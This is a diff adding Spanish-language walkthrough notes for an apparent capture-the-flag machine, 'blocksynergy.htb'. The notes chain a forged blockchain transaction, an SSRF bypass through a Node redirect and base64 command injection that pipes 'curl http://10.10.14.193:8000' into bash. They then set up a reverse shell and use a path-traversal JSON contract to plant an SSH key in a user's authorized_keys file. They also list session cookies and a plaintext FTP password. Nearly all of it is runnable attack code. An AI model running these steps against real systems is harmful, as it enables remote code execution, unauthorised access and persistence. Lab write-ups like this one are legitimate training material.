@@ -1,0 +1,116 @@
+ejecuta esto para añadir tu wallet a VIP
+
++++ vip sh +++
+
+PUB=$(jq -r '.public_key' wallet.json)
+
+jq -n \
+  --arg receiver "$PUB" \
+  --arg timestamp "$(date '+%Y-%m-%d %H:%M:%S.%6N')" \
+  '{
+    sender: "Blockchain_Reward",
+    receiver: $receiver,
+    amount: 100,
+    signature: "Blockchain",
+    timestamp: $timestamp
+  }' > reward.json
+
+curl -sS -c cookies.txt -b cookies.txt \
+  -H 'Content-Type: application/json' \
+  --data @reward.json \
+  http://blocksynergy.htb:8080/broadcast_transaction
+
++++ EOF +++
+
+
+
+* una vez que eres VIP utiliza un truco de BYPASS de SSRF para poder lanzar una peticion al admin panel
+	1.- craftea un bypass usando redirect de node 
+
+  app.get('/', (req, res)=>{
+        res.redirect("http://0.0.0.0:8080/admin")
+  })
+
+* pegale a la ruta con curl recuerda usar la cookie de sesion (volcar el contenido en index.html es solo para verlo mejor en un server de python)
+
+url -sS -i   -H 'Host: blocksynergy.htb:8080' -H 'Cookie: session=RNuWs0zU4dx0ml-DORCk7fOZCQHmcbf_GwJN7yZRWRY' 'http://blocksynergy.htb:8080/dashboard/vip/nodes/test_node/0' > index.html
+
+* Investiga la ruta. veras el boton de ping y descubrirars como funciona
+
+* podemos inyectar comandos en b64 y ejecutarlos pero hay que cratearlos de cierta manera usa el siguiente crafter
+
++++ crafter sh +++
+
+CMD="bash -c 'curl http://10.10.14.193:8000|bash'"
+B=$(echo $CMD | base64)
+
+INJECT=$(printf '%s' \
+  'http' \
+  '://x;echo${IFS}' \
+  "$B" \
+  '|base64${IFS}-d|bash;a@0.0.0.0:8080/')
+
+echo $INJECT
+
+
++++ EOF +++
+
+* modifica o crea un nuevo redireve en el servidor de node
+
++++ main.js +++
+!!! en cmd pega el contenido de de tu comando crafteado en el paso anterior (este es de ejemplo)
+...
+app.get('/', (req, res)=>{
+        let cmd =  "http://x;echo${IFS}YmFzaCAtYyAnY3VybCBodHRwOi8vMTAuMTAuMTQuMTkzOjgwMDAvY2FuYXJ5Jwo=|base64${IFS}-d|bash;a@0.0.0.0:8080/"
+        let url = `http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=${cmd}`
+        console.log(url)
+        res.redirect(url)
+})
+...
+
++++ EOF +++
+
+* craftea una revshell y usala 
+
+
+despues pegale de nuevo al test del endpoint
+curl -sS -i   -H 'Host: blocksynergy.htb:8080' -H 'Cookie: session=Cao1QSBVrqwU0-CwAqSkQ9qzYSV22yDWMR3jlPjORmw' 'http://blocksynergy.htb:8080/dashboard/vip/nodes/test_node/0' > index.html
+
+* Cuando ganamos la revshell sube tu ssh.pub para poder ganar acceso con ssh
+
+* cuando tengas ssh investiga los puertos y encuentra el puerto 5000 que es un puerto de desarrollo
+
+* tuneliza con ssh o chisel y accede a la pagina.
+
+* si lees /opt/staging/smart_contracts/contracts.py veras que recibe JSON con un path para log. 
+
+crea un archivo json malicioso 
+
++++ evil.json +++
+{
+  "name": "rce",
+  "id": "rce",
+  "owner": "Developer",
+  "debug": "True",
+  "logic": { "mint": "allow" },
+  "storage": { "balances": {}, "total_supply": 0 },
+  "hooks": { "on_mint": "log" },
+  "__meta__": {
+    "log_file": "../../../../../home/hank/.ssh/authorized_keys",
+    "log_content": {
+      "on_mint": "\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHlSvEo+yQ7WGK4zGg6ZIJOfEmwEho6gJ6F5+7u3/DxE root@cleanhead\n"
+    }
+  }
+}
+
+
+
++++ EOF +++
+
+* subelo como contract y envia el campo de mint para escribir en el authorized_keys tu llave ssh como si fuera un log
+
+* accede pero ahora como hank
+
+* usando pspy64 puedes encontrar la contraseña del ftp
+
+  /usr/bin/curl -T /tmp/_opt_staging.tar.gz ftp://ftpuser:KTkJSAjuDjSOocAYLgYa@127.0.0.1:15432/upload/_opt_staging.tar.gz
